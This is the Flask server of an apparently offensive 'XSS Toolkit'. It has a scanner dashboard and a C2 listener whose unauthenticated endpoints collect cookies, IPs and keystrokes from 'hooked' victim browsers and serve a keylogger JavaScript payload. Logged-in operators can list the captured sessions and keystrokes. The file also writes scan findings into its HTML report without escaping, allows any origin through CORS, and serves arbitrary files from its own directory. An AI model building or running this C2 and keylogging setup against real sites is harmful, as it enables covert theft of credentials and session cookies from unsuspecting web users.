"""
XSS Toolkit — Main Flask backend server.

Serves the dashboard frontend and exposes REST APIs for scanning,
C2 listener management, payload library, reporting, and user auth.

Usage:
    python server.py
"""

import os
import io
import csv
import json
import time
import secrets
import functools

from flask import (
    Flask, request, jsonify, send_from_directory,
    Response, make_response, session, redirect,
)
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

from config import config
from models import DataStore
from payloads import search_payloads
from scanner import scanner
from c2_listener import c2_server
import auth

# ── App setup ─────────────────────────────────────────────────────────────────

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__, static_folder=BASE_DIR, static_url_path="")
app.secret_key = config.SECRET_KEY
app.config.update(
    SESSION_COOKIE_HTTPONLY=config.SESSION_COOKIE_HTTPONLY,
    SESSION_COOKIE_SAMESITE=config.SESSION_COOKIE_SAMESITE,
    PERMANENT_SESSION_LIFETIME=config.PERMANENT_SESSION_LIFETIME,
)
CORS(app)

# Rate limiter — protects auth endpoints from brute-force
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=[],               # no global limit
    storage_uri="memory://",
)

store = DataStore()

# Initialize user database
auth.init_db()
# Refresh in-memory store from SQLite persistence (load findings/activity).
store._load_persisted_data()


# ══════════════════════════════════════════════════════════════════════════════
#  AUTH — helpers
# ══════════════════════════════════════════════════════════════════════════════

def login_required(f):
    """Decorator that protects API routes — returns 401 if not logged in."""
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return jsonify({"error": "Authentication required"}), 401
        return f(*args, **kwargs)
    return decorated


def get_current_user():
    """Return the current user dict or None."""
    uid = session.get("user_id")
    if uid:
        return auth.get_user_by_id(uid)
    return None


# ══════════════════════════════════════════════════════════════════════════════
#  FRONTEND — serve static files
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    if "user_id" not in session:
        return redirect("/login.html")
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/<path:filename>")
def static_files(filename):
    return send_from_directory(BASE_DIR, filename)


# ══════════════════════════════════════════════════════════════════════════════
#  API — Auth endpoints
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/auth/register", methods=["POST"])
@limiter.limit("10/minute")
def api_register():
    data = request.get_json(force=True, silent=True) or {}
    username = data.get("username", "").strip()
    email = data.get("email", "").strip()
    password = data.get("password", "")

    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400
    if len(username) < 3:
        return jsonify({"error": "Username must be at least 3 characters"}), 400
    if len(password) < 6:
        return jsonify({"error": "Password must be at least 6 characters"}), 400

    # Check if username is already taken
    if not auth.check_username_available(username):
        return jsonify({"error": "Username already taken"}), 409

    # Create user directly (no email verification)
    user = auth.create_user(username, email, password)
    if user is None:
        return jsonify({"error": "Username already taken"}), 409

    session.permanent = True
    session["user_id"] = user["id"]
    session["username"] = user["username"]
    return jsonify({"user": user}), 201



@app.route("/api/auth/login", methods=["POST"])
@limiter.limit("10/minute")
def api_login():
    data = request.get_json(force=True, silent=True) or {}
    username = data.get("username", "").strip()
    password = data.get("password", "")

    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400

    user = auth.authenticate(username, password)
    if user is None:
        return jsonify({"error": "Invalid username or password"}), 401

    session.permanent = True
    session["user_id"] = user["id"]
    session["username"] = user["username"]
    return jsonify({"user": user})


@app.route("/api/auth/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"status": "logged_out"})


@app.route("/api/auth/me")
@login_required
def api_me():
    user = get_current_user()
    if not user:
        session.clear()
        return jsonify({"error": "User not found"}), 401
    return jsonify({"user": user})


@app.route("/api/auth/profile", methods=["PUT"])
@login_required
def api_update_profile():
    data = request.get_json(force=True, silent=True) or {}
    uid = session["user_id"]
    user = auth.update_profile(
        uid,
        email=data.get("email"),
        bio=data.get("bio"),
        avatar_url=data.get("avatar_url"),
    )
    if user:
        return jsonify({"user": user})
    return jsonify({"error": "Update failed"}), 400


@app.route("/api/auth/password", methods=["PUT"])
@login_required
def api_change_password():
    data = request.get_json(force=True, silent=True) or {}
    old_password = data.get("old_password", "")
    new_password = data.get("new_password", "")

    if not old_password or not new_password:
        return jsonify({"error": "Both old and new passwords are required"}), 400
    if len(new_password) < 6:
        return jsonify({"error": "New password must be at least 6 characters"}), 400

    success = auth.change_password(session["user_id"], old_password, new_password)
    if success:
        return jsonify({"status": "password_changed"})
    return jsonify({"error": "Current password is incorrect"}), 403


# ══════════════════════════════════════════════════════════════════════════════
#  API — Dashboard stats
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/stats")
@login_required
def api_stats():
    return jsonify({
        "scans": store.stats["scans"],
        "vulns": store.stats["vulns"],
        "sessions": store.stats["sessions"],
        "blocked": store.stats["blocked"],
    })


@app.route("/api/activity")
@login_required
def api_activity():
    user = get_current_user()
    return jsonify(store.get_activity(user_id=user["id"]))


@app.route("/api/activity", methods=["DELETE"])
@login_required
def api_clear_activity():
    user = get_current_user()
    store.clear_activity(user_id=user["id"])
    return jsonify({"status": "cleared"})


# ══════════════════════════════════════════════════════════════════════════════
#  API — Payloads
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/payloads")
@login_required
def api_payloads():
    ptype = request.args.get("type", "all")
    query = request.args.get("q", "")
    results = search_payloads(query, ptype if ptype != "all" else None)
    return jsonify(results)


# ══════════════════════════════════════════════════════════════════════════════
#  API — Scanner
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/scan/start", methods=["POST"])
@login_required
def api_scan_start():
    data = request.get_json(force=True, silent=True) or {}
    target = data.get("url", "").strip()

    if not target:
        return jsonify({"error": "Missing target URL"}), 400
    if not target.startswith(("http://", "https://")):
        return jsonify({"error": "URL must start with http:// or https://"}), 400

    scan_config = {
        "depth": int(data.get("depth", 2)),
        "threads": int(data.get("threads", 4)),
        "timeout": int(data.get("timeout", 8)),
        "waf": bool(data.get("waf", False)),
        "dom": bool(data.get("dom", True)),
        "template": bool(data.get("template", False)),
        "verify_ssl": bool(data.get("verify_ssl", config.VERIFY_SSL)),
    }

    user = get_current_user()
    result = scanner.start(target, scan_config, user_id=user["id"] if user else None)
    return jsonify(result)


@app.route("/api/scan/stop", methods=["POST"])
@login_required
def api_scan_stop():
    result = scanner.stop()
    return jsonify(result)


@app.route("/api/scan/status")
@login_required
def api_scan_status():
    return jsonify(scanner.get_status())


@app.route("/api/health")
@login_required
def api_health():
    user = get_current_user()
    return jsonify({
        "status": "ok",
        "scan_state": store.scan_state,
        "c2_state": store.c2_state,
        "ps_state": store.ps_state,
        "user": user,
    })


@app.route("/api/scan/logs")
@login_required
def api_scan_logs():
    return jsonify(list(store.scan_logs))


@app.route("/api/scan/logs", methods=["DELETE"])
@login_required
def api_clear_scan_logs():
    store.clear_logs()
    return jsonify({"status": "cleared"})


# ══════════════════════════════════════════════════════════════════════════════
#  API — Findings / Reports
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/findings")
@login_required
def api_findings():
    user = get_current_user()
    vuln_type = request.args.get("type", "all")
    severity = request.args.get("severity", "all")
    findings = store.get_findings(user_id=user["id"] if user else None, vuln_type=vuln_type, severity=severity)
    return jsonify([f.to_dict() for f in findings])


@app.route("/api/findings", methods=["DELETE"])
@login_required
def api_clear_findings():
    user = get_current_user()
    store.clear_findings(user_id=user["id"] if user else None)
    return jsonify({"status": "cleared"})


@app.route("/api/findings/export/<fmt>")
@login_required
def api_export_findings(fmt):
    user = get_current_user()
    findings = store.get_findings(user_id=user["id"] if user else None)
    data = [f.to_dict() for f in findings]

    if fmt == "json":
        resp = make_response(json.dumps(data, indent=2))
        resp.headers["Content-Type"] = "application/json"
        resp.headers["Content-Disposition"] = "attachment; filename=scan_report.json"
        return resp

    if fmt == "csv":
        si = io.StringIO()
        writer = csv.writer(si)
        writer.writerow(["Type", "Severity", "URL", "Field", "Payload", "Time"])
        for f in data:
            writer.writerow([
                f["type"], f["severity"], f["url"],
                f["field"], f["payload"], f["time"],
            ])
        resp = make_response(si.getvalue())
        resp.headers["Content-Type"] = "text/csv"
        resp.headers["Content-Disposition"] = "attachment; filename=scan_report.csv"
        return resp

    if fmt == "html":
        rows = "".join(
            f'<tr><td>{i+1}</td><td>{f["type"]}</td><td>{f["severity"]}</td>'
            f'<td>{f["url"]}</td><td>{f["field"]}</td><td>{f["time"]}</td></tr>'
            for i, f in enumerate(data)
        )
        html = f"""<!DOCTYPE html><html><head><title>XSS Report</title>
<style>body{{font-family:monospace;background:#0a0c10;color:#e2e8f0;padding:20px}}
table{{border-collapse:collapse;width:100%}}th,td{{border:1px solid #333;padding:8px;text-align:left}}
th{{background:#161b26}}</style></head><body>
<h2>XSS Scan Report</h2>
<p>Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
<table><thead><tr><th>#</th><th>Type</th><th>Severity</th><th>URL</th><th>Field</th><th>Time</th></tr></thead>
<tbody>{rows}</tbody></table></body></html>"""
        resp = make_response(html)
        resp.headers["Content-Type"] = "text/html"
        resp.headers["Content-Disposition"] = "attachment; filename=scan_report.html"
        return resp

    return jsonify({"error": "Invalid format. Use json, csv, or html."}), 400


# ══════════════════════════════════════════════════════════════════════════════
#  API — C2 Listener
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/c2/start", methods=["POST"])
@login_required
def api_c2_start():
    data = request.get_json(force=True, silent=True) or {}
    host = data.get("host", "127.0.0.1")
    port = int(data.get("port", 9000))
    token = data.get("token", "")
    user = get_current_user()
    result = c2_server.start(host, port, token or None, user_id=user["id"] if user else None)
    return jsonify(result)


@app.route("/api/c2/stop", methods=["POST"])
@login_required
def api_c2_stop():
    user = get_current_user()
    result = c2_server.stop(user_id=user["id"] if user else None)
    return jsonify(result)


@app.route("/api/c2/status")
@login_required
def api_c2_status():
    return jsonify(c2_server.get_status())


@app.route("/api/c2/sessions")
@login_required
def api_c2_sessions():
    sessions = c2_server.get_sessions()
    return jsonify([s.to_dict() for s in sessions])


@app.route("/api/c2/keystrokes")
@login_required
def api_c2_keystrokes():
    session_id = request.args.get("session_id")
    keystrokes = c2_server.get_keystrokes(session_id)
    return jsonify([k.to_dict() for k in keystrokes])


@app.route("/api/c2/keystrokes", methods=["DELETE"])
@login_required
def api_c2_clear_keystrokes():
    c2_server.clear_keystrokes()
    return jsonify({"status": "cleared"})


# ── C2 endpoints for hooked browsers ──────────────────────────────────────────

@app.route("/api/c2/log", methods=["POST"])
def api_c2_log():
    """Receive session check-in from a hooked browser."""
    data = request.get_json(force=True, silent=True) or {}
    token = data.get("token", "")

    if not c2_server.validate_token(token):
        return jsonify({"error": "Unauthorized"}), 403

    ip = request.remote_addr or data.get("ip", "unknown")
    user_agent = data.get("user_agent", request.headers.get("User-Agent", ""))
    cookies = data.get("cookies", "")

    sess = c2_server.register_session(ip, user_agent, cookies)
    if sess:
        return jsonify({"status": "ok", "session_id": sess.id})
    return jsonify({"error": "C2 not active"}), 503


@app.route("/api/c2/keys", methods=["POST"])
def api_c2_keys():
    """Receive keystrokes from a hooked browser."""
    data = request.get_json(force=True, silent=True) or {}
    token = data.get("token", "")

    if not c2_server.validate_token(token):
        return jsonify({"error": "Unauthorized"}), 403

    ip = request.remote_addr or "unknown"
    key = data.get("key", "")
    session_id = data.get("session_id", "")

    if key:
        c2_server.log_keystroke(session_id, ip, key)
        return jsonify({"status": "ok"})
    return jsonify({"error": "No key provided"}), 400


@app.route("/api/c2/payload.js")
def api_c2_payload_js():
    """Serve the keylogger JavaScript payload."""
    js = c2_server.get_keylogger_js()
    return Response(js, mimetype="application/javascript")


# ── Payload server toggle ─────────────────────────────────────────────────────

@app.route("/api/ps/start", methods=["POST"])
@login_required
def api_ps_start():
    data = request.get_json(force=True, silent=True) or {}
    port = int(data.get("port", 8080))
    result = c2_server.start_payload_server(port)
    return jsonify(result)


@app.route("/api/ps/stop", methods=["POST"])
@login_required
def api_ps_stop():
    result = c2_server.stop_payload_server()
    return jsonify(result)


@app.route("/api/ps/status")
@login_required
def api_ps_status():
    return jsonify(store.ps_state)


# ══════════════════════════════════════════════════════════════════════════════
#  Run
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("  XSS Toolkit — Backend Server")
    print("  Dashboard:  http://127.0.0.1:5000")
    print("  Login:      http://127.0.0.1:5000/login.html")
    print("  API Base:   http://127.0.0.1:5000/api")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
